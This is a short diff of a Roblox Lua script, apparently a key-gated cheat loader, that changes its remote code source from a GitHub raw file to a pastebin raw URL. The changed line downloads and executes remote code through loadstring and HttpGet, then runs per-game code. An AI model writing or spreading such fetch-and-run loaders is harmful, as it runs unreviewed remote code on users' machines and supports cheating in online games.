@@ -119,7 +119,7 @@ end
 -- Run the script after key verification
 local function runMainScript()
     -- Your original script logic here
-    local Games = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/InfectiousSmile.lua", true))()
+    local Games = loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()
 
     for PlaceID, Execute in pairs(Games) do
         if PlaceID == game.PlaceId then
